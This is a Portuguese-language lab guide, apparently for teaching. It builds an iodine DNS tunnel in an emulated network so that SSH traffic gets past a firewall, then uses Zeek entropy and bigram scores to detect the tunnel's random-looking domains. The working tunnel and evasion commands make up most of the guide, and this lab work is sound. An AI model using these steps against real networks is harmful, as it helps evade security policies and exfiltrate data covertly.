## 🔷 Contextualização

![Representação da topologia do laboratório](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab05-seguranca-dns/images/topologia.png)

Neste laboratório, você irá aprender sobre como o tunelamento DNS pode ser utilizado para burlar políticas de segurança. O laboratório é composto por 3 grupos:

1. Rede Corporativa HackInSDN;
2. Rede da Random Company;
3. Rede do túnel DNS.

Sendo que o objetivo é acessar o servidor SSH da Random Company, a partir da rede 1, a qual bloqueia tráfego SSH por motivos de segurança, utilizando a rede 3 para estabecer um túnel DNS que permite o tráfego SSH.

## 🔷 Atividade 1: Teste de acesso ao serviço SSH

O protocolo SSH (Secure Shell) promove comunicação segura entre um cliente e um servidor. Ele utiliza criptografia para proteger a transmissão de dados, garantindo que os pacotes de informação sejam enviados de forma segura. O SSH é muito utilizado para gerenciar dispositivos remotos, permitindo que administradores acessem e controlem servidores e outros equipamentos de maneira segura, mesmo em redes não confiáveis.

### 🔹 Atividade 1.1: Iniciando o serviço SSH no randomSrv

Inicialmente, o serviço SSH não está ativado, de modo que precisamos habilitá-lo. Podemos verificar a disponibilidade do serviço SSH executando o seguinte comando no randomSrv:

```
netstat -tuln | grep :22
```

Que não terá nenhuma saída, pois o serviço SSH não está habilitado. Nesse sentido, podemos habilitar o serviço SSH no servidor da Random Company, utilizando o _service-mnsec-ssh_, aplicação criada para utilização no dashboard HackInSDN. Para isso, execute os seguintes comandos no host _randomSrv_:

```
#Iniciando o serviço
service-mnsec-ssh.sh randomSrv --start
#Verificando o status do protocolo SSH
netstat -tuln | grep :22
```

A saída deve ser a seguinte:

```
root@randomSrv:~# netstat -tuln | grep :22
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
```

Que representa que o aparelho está à escuta de novas conexões na porta 22, o que indica que o serviço SSH está ativo. Após isso, será possível acessar remotamente o host _randomsSrv_ através do protocolo SSH.

Após iniciar o serviço SSH, podemos configurar um usuário para permitir o acesso remoto. Para isso, podemos executar o seguinte comando no _randomSrv_:

```
adduser myuser
```

Sendo que será requisitada uma senha e sua confirmação, podendo ser utilizada uma senha simples como "myuserpass", além da requisição de outras informações que podem ser deixadas em branco. 

### 🔹 Atividade 1.2: Tentando acessar o serviço no h101

Após a configuração e inicialização do serviço SSH, podemos tentar acessá-lo a partir do h101, executando o seguinte comando:

```
ssh root@192.2.0.2
```

Porém, inicialmente não será observada nenhuma saída. Após alguns minutos, o comando terá a seguinte saída de erro:

```
root@h101:~# ssh myuser@203.0.113.2
ssh: connect to host 203.0.113.2 port 22: Connection timed out
```

Isso ocorre por conta das regras estabelecidas no fw101, as quais liberam tráfego HTTP, HTTPS, ICMP e DNS, mas bloqueia para outros protocolos, por questões de segurança. 

## 🔷 Atividade 2: Estabelecimento do túnel DNS

Após verificarmos que não é possível acesar o serviço SSH a partir do h101, iremos estabelecer um túnel DNS, a partir do qual poderemos permitir tráfego SSH na Rede Corporativa HackInSDN por meio de requisições DNS. Ao longo dessa atividade, você irá entender sobre como esse processo é estabelecido.

### 🔹 Atividade 2.1: Iniciando o servidor do túnel no srv201

O _srv201_ irá atuar como servidor do túnel DNS, de modo que ele irá resolver os nomes de domínios que serão criados posteriormente para estabelecimento do túnel. Para iniciar o servidor DNS, primeiro é preciso instalar o iodine, ferramenta a qual será utilizada para estabelecer o túnel. Para isso, podemos executar os seguintes comandos no terminal do Mininet-Sec:

```
apt update && apt install iodine -y
#Criação de diretórios necessários
mkdir -p /dev/net
mknod /dev/net/tun c 10 200
chmod 666 /dev/net/tun
```

Após isso, podemos executar o seguinte comando no host _srv201_:

```
iodined -f -c -P SuperSecretPassword 10.199.199.1/24 t1.teste.ufba.com
```

Sendo que o comando possui os seguintes parâmetros:

1. `iodined`: Parâmetro utilizado para indicar que estamos lidando com o servidor do túnel;
2. `-f`: Parâmetro que faz com que o comando continue sendo executado em primeiro plano;
3. `-P`: Parâmetro para estabelecer a seha a qual será requisitada para iniciar conexão no túnel;
4. `SuperSecretPassword`: A senha que iremos utilizar para autenticar conexão ao túnel;
5. `10.199.199.1/24`: Máscara de rede a partir da qual serão definidos os endereços dos hosts no contexto do túnel;
6. `t1.teste.ufba.com`: Nome de domínio a partir do qual serão enviados.

De modo que o srv201, como servidor do túnel DNS, passa a esperar requisições do cliente para estabelecer o túnel. 

A saída do comando deve ser a seguinte:

```
root@srv201:~# iodined -f -c -P SuperSecretPassword 10.199.199.1/24 t1.teste.ufba.com
Opened dns0
Setting IP of dns0 to 10.199.199.1
Setting MTU of dns0 to 1130
Opened IPv4 UDP socket
Listening to dns for domain t1.teste.ufba.com
```

### 🔹 Atividade 2.2: Iniciando o serviço Mnsec-Bind9 no fw101

Para estabelecer um túnel DNS, é preciso criar os nomes de domínios os quais serão utilizados para comunicação dentro do túnel. Nesse sentido, iremos utilizar o host _fw101_ para criação de nomes de domínios os quais serão resolvidos no host _srv201_, de forma que o _h101_ poderá se comunicar com o _srv201_ através de requisições DNS, o que permitirá estabelecimento do túnel.

Nesse sentido, é preciso permitir comunicação entre processos internos, a partir da permissão de tráfego na interface _loopback_ do _fw101_. Esse processo é necessário para viabilizar a resolução de nomes, pois permite que o processo que recebe a requisição DNS possa solicite um roteamento para fazer com a requisição chegue ao destino. Para isso, execute no terminal do _fw101_:

```
iptables -I INPUT -i lo -j ACCEPT
```

Após isso, precisamos configurar o processo de resolução de nomes no _fw101_. Para isso, precisamos iniciar o serviço msec-bind9, que foi criado no contexto do dashboard HackInSDN para permitir a criação de nomes de domínio nas topologias dos laboratórios. Para iniciar o serviço e adicionar um domínio, devemos executar os seguintes comandos:

```
service-mnsec-bind9.sh fw101 --start
service-mnsec-bind9.sh fw101 --add-zone teste.ufba.com
```

Sendo que o primeiro comando inicia o serviço msec-bind9, enquanto o segundo adiciona o nome de domínio teste.ufba.br ao serviço. 

### 🔹 Atividade 2.3: Criação de domínios no fw101 utilizando o serviço Mnsec-Bind9

Após isso, iremos adicionar alguns registros DNS ao nome de domínio, para permitir a resolução de nomes. Primeiro, iremos adicionar um registro do tipo A, o qual é resolvido diretamente em um endereço IP, nesse caso, o IP do host _srv201_, permitindo o envio de requisições DNS para ele. Nesse sentido, execute o seguinte comando no host _fw101_:

```
service-mnsec-bind9.sh fw101 --add-entry teste.ufba.com srv201 IN A 203.0.113.2
```

Dessa forma, se um host tentar resolver o nome de domínio _teste.ufba.br_, a requisição será enviada para o IP do _srv201_.

Após isso, definiremos um registro DNS do tipo NS (Name Server), o qual será utilizado para estabelecer o túnel DNS. O registro do tipo NS é associado a um outro nome de domínio, que pode ter um registro do tipo A, por exemplo, o qual é resolvido por um host que podemos chamar de servidor autoritário. 

Nesse contexto, quando uma requisição é enviada para um nome de domínio que tem registro do tipo NS, a requisição é enviada para o servidor autoritário, o qual resolve o nome de domínio associado ao registro NS.

Tendo isso em vista, no túnel DNS, o registro NS será utilizado para estabelecer o túnel e será associado a um nome de domínio com registro A associado ao IP do host _srv201_, de modo que as requisições para o primeiro, enviadas a partir do _h101_, serão encaminhadas para o segundo, permitindo comunicação entre o _h101_ e o _srv201_ através de requisições DNS.

Considerando isso, iremos adicionar um registro do tipo NS associado ao registro do tipo A atrelado ao IP do _srv201_, executando o seguinte comando:

```
service-mnsec-bind9.sh fw101 --add-entry teste.ufba.com t1 IN NS srv201
```

Após isso, podemos executar alguns comandos no _h101_ para verificar se a resolução de domínios ocorre corretamente, sendo que:

1. O primeiro comando envia uma requisição para o servidor DNS localizado no fw101 para obter informações sobre o nome de domínio _teste.ufba.br_;
2. O segundo comando envia uma requisição para o servidor DNS localizado no fw101 para obter informações sobre o nome de domínio do tipo A _srv201.teste.ufba.br_;
3. O segundo comando envia uma requisição para o servidor DNS localizado no fw101 para obter informações sobre o nome de domínio do tipo NS _t1.teste.ufba.br_;

Primeiramente, precisamos fazer o _download_ da ferramenta _dnsutils_, a qual inclui a ferramenta _dig_, a qual iremos utilizar para obter informações dos domínios criados. Para isso, devemos executar os seguintes comandos no terminal do _Mininet-Sec_:

```
apt update && apt install dnsutils -y
```

Após isso, vamos configurar o _fw101_ como resolvedor DNS do _h101_, de modo que todas as requisições DNS do segundo sejam enviadas para o primeiro. Para isso devemos executar o seguinte comando no _h101_:

```
echo "nameserver 198.51.100.1" > /etc/resolv.conf
```

De modo que alteramos o arquivo `resolv.conf`, mudando as configurações de resolução DNS do _h101_. 

Tendo feito isso, podemos executar os seguintes comandos no _h101_ para verificar a resolução dos domínios criados:

```
dig teste.ufba.com
dig srv201.teste.ufba.com A
dig t1.teste.ufba.com NS
```

Ao analisar as saídas desses comandos, será possível observar informações sobre os domínios registrados, sendo que `status: NOERROR` indica que não há erros em relação à requisição feita.

**Saída do primeiro comando**

```
root@h101:~# dig teste.ufba.com

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> teste.ufba.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 11109
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: 4a066f993d41339d010000006850378fa11804ed6dc03aae (good)
;; QUESTION SECTION:
;teste.ufba.com.                        IN      A

;; ANSWER SECTION:
teste.ufba.com.         604800  IN      A       127.0.0.1

;; Query time: 0 msec
;; SERVER: 198.51.100.1#53(198.51.100.1) (UDP)
;; WHEN: X Y Z 00:00:00 UTC 2025
;; MSG SIZE  rcvd: 87
```

**Saída do segundo comando**

```
root@h101:~# dig srv201.teste.ufba.com A

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> srv201.teste.ufba.com A
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 58553
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: c4ab9f288ebb655701000000685037d56b0f4f7c496fc856 (good)
;; QUESTION SECTION:
;srv201.teste.ufba.com.         IN      A

;; ANSWER SECTION:
srv201.teste.ufba.com.  604800  IN      A       203.0.113.2

;; Query time: 4 msec
;; SERVER: 198.51.100.1#53(198.51.100.1) (UDP)
;; WHEN: X Y Z 00:00:00 UTC 2025
;; MSG SIZE  rcvd: 94
```

**Saída do terceiro comando**

```
root@h101:~# dig  t1.teste.ufba.com NS

; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> t1.teste.ufba.com NS
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 35566
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: 2bc955ef5b8bc93401000000685037fb3f8f2a61836403ed (good)
;; QUESTION SECTION:
;t1.teste.ufba.com.             IN      NS

;; ANSWER SECTION:
t1.teste.ufba.com.      3114    IN      NS      ns.t1.teste.ufba.com.

;; ADDITIONAL SECTION:
ns.t1.teste.ufba.com.   3114    IN      A       203.0.113.2

;; Query time: 0 msec
;; SERVER: 198.51.100.1#53(198.51.100.1) (UDP)
;; WHEN: X Y Z 00:00:00 UTC 2025
;; MSG SIZE  rcvd: 107
```

### 🔹 Atividade 2.4: Estabelecimento do túnel

Sabendo que iniciamos o servidor do túnel na atividade 2.1, podemos então conectar o cliente, o _h101_, ao túnel, executando o seguinte comando no mesmo:

```
iodine -f -r -P SuperSecretPassword 198.51.100.1 t1.teste.ufba.com
```

O qual possui quase os mesmos parâmetros do comando anterior, e que promove o envio de requisições DNS do _h101_ para o _srv201_, as quais possuem características as quais farão o _srv201_ iniciar a conexão do túnel. O parâmetro `-r` é usado para anular o teste de envio de pacotes UDP para o servidor.

Após a execução desse comando, o túnel será iniciado, como podemos observar na seguinte saída do _h101_:

```
root@h101:~# iodine -f -r -P SuperSecretPassword  t1.teste.ufba.com
Opened dns0
Opened IPv4 UDP socket
Sending DNS queries for t1.teste.ufba.com to 198.51.100.1
Autodetecting DNS query type (use -T to override).
Using DNS type NULL queries
Version ok, both using protocol v 0x00000502. You are user #1
Setting IP of dns0 to 10.199.199.3
Setting MTU of dns0 to 1130
Server tunnel IP is 10.199.199.1
Skipping raw mode
Using EDNS0 extension
Switching upstream to codec Base128
Server switched upstream to codec Base128
No alternative downstream codec available, using default (Raw)
Switching to lazy mode for low-latency
Server switched to lazy mode
Autoprobing max downstream fragment size... (skip with -m fragsize)
768 ok.. ...1152 not ok.. ...960 not ok.. 864 ok.. 912 ok.. 936 ok.. ...948 not ok.. will use 936-2=934
Setting downstream fragment size to max 934...
Connection setup complete, transmitting data.
```

Após isso, podemos verificar a conectividade no túnel executando o seguinte comando no _srv201_:

```
ping -c 5 10.199.199.2
```

Cuja seguinte saída indica que o _srv201_ consegue se conectar ao _h101_ através do túnel:

```
root@srv201:~# ping -c 5 10.199.199.2
PING 10.199.199.2 (10.199.199.2) 56(84) bytes of data.
64 bytes from 10.199.199.2: icmp_seq=1 ttl=64 time=2.61 ms
64 bytes from 10.199.199.2: icmp_seq=2 ttl=64 time=3.08 ms
64 bytes from 10.199.199.2: icmp_seq=3 ttl=64 time=3.01 ms
64 bytes from 10.199.199.2: icmp_seq=4 ttl=64 time=3.68 ms
64 bytes from 10.199.199.2: icmp_seq=5 ttl=64 time=2.86 ms

--- 10.199.199.2 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4005ms
rtt min/avg/max/mdev = 2.605/3.045/3.675/0.353 ms
```

Além disso, podemos executar o seguinte comando no _h101_ para verificar se ele consegue se conectar ao _srv201_ no contexto do túnel:

```
ping -c 5 10.199.199.1
```

Cuja saída deve ser a seguinte:

```
root@h101:~# ping -c 5 10.199.199.1
PING 10.199.199.1 (10.199.199.1) 56(84) bytes of data.
64 bytes from 10.199.199.1: icmp_seq=1 ttl=64 time=4.41 ms
64 bytes from 10.199.199.1: icmp_seq=2 ttl=64 time=2.73 ms
64 bytes from 10.199.199.1: icmp_seq=3 ttl=64 time=2.79 ms
64 bytes from 10.199.199.1: icmp_seq=4 ttl=64 time=3.34 ms
64 bytes from 10.199.199.1: icmp_seq=5 ttl=64 time=3.11 ms

--- 10.199.199.1 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4006ms
rtt min/avg/max/mdev = 2.734/3.277/4.409/0.607 ms
```

### 🔹 Atividade 2.5: Mudanças de regras de firewall

Uma vez estabelecido o túnel, podemos enfim utilizá-lo para fazer com que o _h101_ se conecte ao serviço SSH do _randomSrv_, através da exfiltração de dados via requisições DNS, processo sobre o qual iremos aprender mais a seguir.

Nesse sentido, o primeiro passo é executar o seguinte comando no _h101_:

```
ip route add 192.2.0.2 via 10.199.199.1
```

Ao executarmos esse comando, adicionamos uma nova regra de roteamento no _h101_, a qual faz com que os pacotes que tenham como destino o _randomSrv_, que possui o IP 192.2.0.2, sejam encaminhados ao IP 10.199.199.1, que corresponde à interface do _srv201_ a qual é utilizada pelo mesmo para se comunicar no túnel.

Após isso, vamos executar o seguinte comando no _srv1_, para fazer com que todos os pacotes que saiam pela interface srv201-eth0 tenham seu IP de origem alterado para o IP da interface:

```
iptables -t nat -A POSTROUTING -o srv201-eth0 -j MASQUERADE
```

Isso é útil pois faz com que os pacotes originados nas interfaces relativas ao túnel em _h101_ ou _srv201_ possam ser encaminhados para outros hosts com o IP legítimo da interface srv201-eth0, o qual está incluído em regras de roteamento dos outros hosts.

### 🔹 Atividade 2.6: Conectando o h101 ao serviço SSH do randomSRV via túnel DNS:

Agora podemos enfim, fazer com que o _h101_ se conecte ao serviço SSH do _randomSrv_,executando o seguinte comando:

```
ssh myuser@192.2.0.2
```

Comando que será seguido por requisição de confirmação da tentativa de conexão e requisição da senha anteriormente configurada. Após inserirmos as informações requisitadas, teremos a seguinte saída:

```
root@h101:~# ssh myuser@192.2.0.2
The authenticity of host '192.2.0.2 (192.2.0.2)' can't be established.
RSA key fingerprint is SHA256:RuIL/J6CEZk+NEItUOtCfHnMNkrjqCQx+IbNauC0YNk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.2.0.2' (RSA) to the list of known hosts.
myuser@192.2.0.2's password: 
Linux mininet-sec-d19704818e714b-5b4f94458f-llh7h 5.4.0-172-generic #190-Ubuntu SMP Fri Feb 2 23:24:22 UTC 2024 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
myuser@mininet-sec-d19704818e714b-5b4f94458f-llh7h:~$ 
```

Indicando que o acesso ao usuário remoto foi feito com sucesso. Nesse sentido, podemos entender como a comunicação ocorre a partir do seguinte diagrama:

![Diagrama representando as etapas da requisição DNS](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab05-seguranca-dns/images/etapas_requisicao_dns.png)

Sendo que:

1. Etapa 1: Representa o envio da requisição DNS pelo _h101_ no contexto do túnel, contendo a solicitação de acesso ao serviço SSH do _randomSrv_, para o _fw101_, que foi configurado como resolvedor DNS do _h101_;
2. Etapa 2: Representa o envio da requisição DNS para o _srv201_, configurado para resolver o nome de domínio usado para estabelecer o túnel, através da conexão entre o _fw101_ e o _r201_;
3. Etapa 3: Após receber a requisição DNS, o _srv201_ a desencapsula, analisa suas informações e verifica a solicitação de acesso ao serviço SSH do _randomSrv_, e o encaminha para o mesmo, fazendo com que a conexão de um cliente a um servidor SSH ocorra através de um túnel DNS

Após isso, o _randomSrv_ recebe as informações necessárias e responde à solicitação do _h101_. Quando a resposta chega ao _srv201_, ela é encapsulada em uma resposta DNS a qual é enviada para o _h101_ no túnel, de forma que este último consegue acessar o serviço SSH do randomSrv apesar das restrições de tráfego da rede corporativa HackInSDN.

### 🔹 Atividade 2.7: Encerrando a conexão ao túnel

Após a realização das atividades, o túnel DNS pode ser encerrado utilizando as teclas `Ctrl+C` nos terminais do _srv201_ e _h101_.

## 🔷 Atividade 3: Verificação da criação de logs no Zeek

O objetivo dessa atividade é analisar as informações relativas a domínios legítimos e a domínios gerados aleatoriamente no contexto de túneis DNS, visando observar suas diferneças e como elas podem ser utilizadas na detecção de túneis DNS. Para isso, iremos utilizar a ferramenta Zeek, que é um analisador de tráfego _Open Source_ o qual pode ser usado para monitorar o tráfego de rede de forma customizada. Nesse sentido, iremos utilizar um script da ferramenta para fazer análises sobre o tráfego DNS da rede.

### 🔹 Atividade 3.1: Iniciando o monitoramento de rede

Para executarmos essa etapa, primeiro precisamos verificar a presença do script que vamos usar no ambiente, nomeado `dns_lab_script.zeek`. Para isso, podemos executar os seguintes comandos no host _zeek_:

```
#Acessando o diretório no qual temos o script
cd scripts/lab-dns/
#Verificando a presença do script
ls 
#Saída: dns_lab_script.zeek
```

Após verificarmos a presença do script, podemos iniciar o monitoramento de rede utilizando ele. Para isso, é recomendado criar um diretório para armazenar os logs que serão gerados, executando o seguinte comando, ainda no diretório `/scripts/lab-dns`:

```
#Criando o diretório
mkdir logs_benigno
#Acessando o diretório
cd logs_benigno
```

Podemos então iniciar o monitoramento pelo host _zeek_:

```
zeek -i br0 ../dns_lab_script.zeek
```

Sendo que estamos monitorando a interface `br0`, que intercepta tanto tráfego que ocorre entre _zeek_ e _fw101_ quanto entre _zeek_ e _h101_.

### 🔹 Atividade 3.2: Criação de domínios no fw101 utilizando o serviço Mnsec-Bind9

Nessa etapa, iremos registrar nomes de domínio que representam o comportamento benigno do usuário, visando verificar a diferença da análise feita pelo Zeek de um nome comum e um nome gerado aleatoriamente no contexto do túnel DNS, executando os seguintes comandos no _fw101_:


```
service-mnsec-bind9.sh fw101 --add-zone google.com
service-mnsec-bind9.sh fw101 --add-entry google.com news IN A 203.0.113.2
service-mnsec-bind9.sh fw101 --add-zone microsoft.com
service-mnsec-bind9.sh fw101 --add-entry microsoft.com office IN A 203.0.113.2
```

Considerando que o serviço de registro de domínios foi iniciado nas etapas anteriores, mas, caso seja preciso inciá-lo novamente, basta executar o seguinte comando antes dos outros:

```
service-mnsec-bind9.sh fw101 --start
```

> [!IMPORTANT]
> Perceba que estamos utilizando o IP do srv201 para hospedar mais de um nome de domínio, o que é totalmente possível e aplicável na vida real, onde um servidor pode hospedar vários nomes de domínio. Você conhecia essa possibilidade? Escreva sobre o seu entendimento acerca da relação entre servidores e os domínios os quais eles podem hospedar.
<textarea name="resposta_dump_manual" rows="6" cols="80" placeholder="Escreva sua resposta aqui..."> </textarea>

### 🔹 Atividade 3.3: Acesso e análise dos domínios benignos

Primeiramente, iremos acessar os nomes de domínio benignos criados anteriormente a partir do _h101_, para que sejam gerados logs sobre essa atividade:

```
dig google.com
dig news.google.com
dig microsoft.com
dig office.microsoft.com
```

Feito isso, podemos verificar os logs gerados, acessando o terminal do _Zeek_ no qual iniciamos o monitoramento. Para isso, apertamos `Ctrl+C` para interromper o monitoramento e digitamos `ls` para verificar os arquivos gerados, e teremos a seguinte saída:

```
conn.log  dns.log  packet_filter.log  reporter.log  weird.log  wtg_domains_analysis.log
```

O log que temos interesse em analisar é o `wtg_domains_analysis.log`. Nesse sentido, execute `cat wtg_domains_analysis.log` no terminal do _Zeek_ para observar o conteúdo do arquivo, que pode se assimilar ao seguinte:

```
#fields ctime   uid     id.orig_h       id.orig_p       id.resp_h       id.resp_p       rquery  entropy score   detection_type
#types  time    string  addr    port    addr    port    string  double  double  string
1750086011.952619       CzD7rvOKZ9EP15IHl       198.51.100.2    48287   198.51.100.1    53      google.com      2.921928        15631.0 DOMAIN_ANALYSIS
1750086011.982602       CE4iVE1TZOfcLB7Dgj      198.51.100.2    39968   198.51.100.1    53      news.google.com 3.323231        18151.0 DOMAIN_ANALYSIS
1750086012.015067       CLkqhv2IVgOVDDnReg      198.51.100.2    50745   198.51.100.1    53      microsoft.com   3.026987        16087.0 DOMAIN_ANALYSIS
1750086012.040061       CTj60rA8cR9qSpIpi       198.51.100.2    57895   198.51.100.1    53      office.microsoft.com    3.284184        18195.0 DOMAIN_ANALYSIS
```

Existem dois parâmetros de interesse no log: entropia (_entropy_) e pontuação (_score_), os quais podem ser usados na detecção de tunelamento DNS.

### 🔹 Entropia, pontuação e seu uso na detecção de tunelamento DNS

A entropia é o quão aleatório um determinado dado é, e pode ser calculado a partir da fórmula de Shannon, representada na figura abaixo. O uso da entropia pode ser importante para detectar tunelamento DNS pelo fato de domínios gerados aleatoriamente poderem apresentar maiores entropias, devido às suas características anômalas.

![Fórmula de Shannon para cálculo de entropia](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab05-seguranca-dns/images/shannons_formula.jpg)

A pontuação pode ser definida como a soma de frequência de bigramas, sendo que o processo do seu cálculo explicado na imagem a seguir:

![Diagrama explicativo sobre cálculo de frequência de bigramas](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/main/lab05-seguranca-dns/images/bigramas.png)

Sendo que, nesse caso, os bigramas foram extraídos da base de dados do site [Alexa](https://www.kaggle.com/datasets/cheedcheed/top1m), o qual possui conjuntos de domínios populares os quais já foram utilizados em pesquisas relativas à análise de tunelamento DNS. Considerando as diferenças das estruturas de domínios legítmos e domínios gerados aleatoriamente, a pontuação pode ser um parâmetro de diferenciação entre eles.

Ou seja, para cada nome de domínio que o Zeek analisa, ele verifica se os bigramas do mesmo estão contidos no conjunto de bigramas obtidos da base de dados da Alexa e soma os valores associados a ele, gerando a pontuação. Caso o bigrama não esteja na base de dados, sua frequência é dada como zero.

### 🔹 Atividade 3.4: Acesso e análise dos domínios aleatórios

Nessa etapa, analisaremos as informações geradas ao acessar domínios aleatórios gerados no túnel DNS, considerando os nomes de domínios criados anteriormente. Para isso, podemos interromper o monitoramento do _Zeek_ pressionado `Ctrl+C` e criar um novo diretório, para que os dados gerados nessa etapa possam ficar armazenados em outro log, permitindo melhor visualização, executando os seguintes comandos no terminal do _Zeek_:

```
cd ..
mkdir logs_tunel
cd logs_tunel
#Iniciando o monitoramento pelo Zeek
zeek -i br0 ../dns_lab_script.zeek
```

Para verificar as informações relativas aos domínios gerados aleatoriamente no contexto do tunelamento DNS, podemos iniciar o túnel utilizando os comandos previamente abordados:

Iniciando o servidor do túnel no _srv201_:

```
iodined -f -c -P SuperSecretPassword 10.199.199.1/24 t1.teste.ufba.com
```

Conectando o _h101_ ao túnel:

```
iodine -f -r -P SuperSecretPassword t1.teste.ufba.com
```

Após esse acesso, podemos voltar ao terminal do Zeek, parar o monitoramento apertando as teclas `Ctrl+C` e executar `cat wtg_domains_analysis.log` para verificar o conteúdo do log que armazena as entropias e pontuações, de modo que o seu conteúdo pode se assimilar ao seguinte:

```
#fields ctime   uid     id.orig_h       id.orig_p       id.resp_h       id.resp_p       rquery  entropy score   detection_type
#types  time    string  addr    port    addr    port    string  double  double  string
1750088913.024773       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      yrbzjw.t1.teste.ufba.com        3.886842        18867.0 DOMAIN_ANALYSIS
1750088913.032049       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      vaaaakatfg2.t1.teste.ufba.com   3.767993        19948.0 DOMAIN_ANALYSIS
1750088913.041505       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      laaicaraon53srcqdr24molvjapxwkoa.t1.teste.ufba.com      4.568367        24743.0 DOMAIN_ANALYSIS
1750088913.045905       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      yrbzjz.t1.teste.ufba.com        3.803509        18874.0 DOMAIN_ANALYSIS
1750088913.056969       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      zzj0aa-aaahhh-drink-mal-ein-j\xe4germeister-.t1.teste.ufba.com  4.328565        28894.0 DOMAIN_ANALYSIS
1750088913.071620       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      zzj1aa-la-fl\xfbte-na\xefve-fran\xe7aise-est-retir\xe9-\xe0-cr\xe8te.t1.teste.ufba.com  4.251981    30105.0 DOMAIN_ANALYSIS
1750088913.085348       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      zzj2aabbccddeeffgghhiijjkkllmmnnooppqqrrssttuuvvwwxxyyzz.t1.teste.ufba.com      4.808795   23871.0  DOMAIN_ANALYSIS
1750088913.100751       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      zzj3aa0123456789\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf.t1.teste.ufba.com  5.282484        18861.0 DOMAIN_ANALYSIS
1750088913.129206       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      zzj4aa\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd.t1.teste.ufba.com    5.822001        18796.0 DOMAIN_ANALYSIS
1750088913.136824       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      sahzj5.t1.teste.ufba.com        3.886842        19099.0 DOMAIN_ANALYSIS
1750088913.140520       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      oalzka.t1.teste.ufba.com        3.803509        20280.0 DOMAIN_ANALYSIS
1750088913.216992       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      rayadg\xd7oukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg.\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xce.oukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceo.ukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xceoukfc\xbfg\xce.t1.teste.ufba.com 3.466838        35169.0 DOMAIN_ANALYSIS
1750088913.296240       CqOsPy3VhOIFcrDuy       198.51.100.2    47542   198.51.100.1    53      rbeadhzoksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0h.q\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq.\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6.ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq\xc6ksje\xc0hq.t1.teste.ufba.com       3.49095 24491.0 DOMAIN_ANALYSIS
```

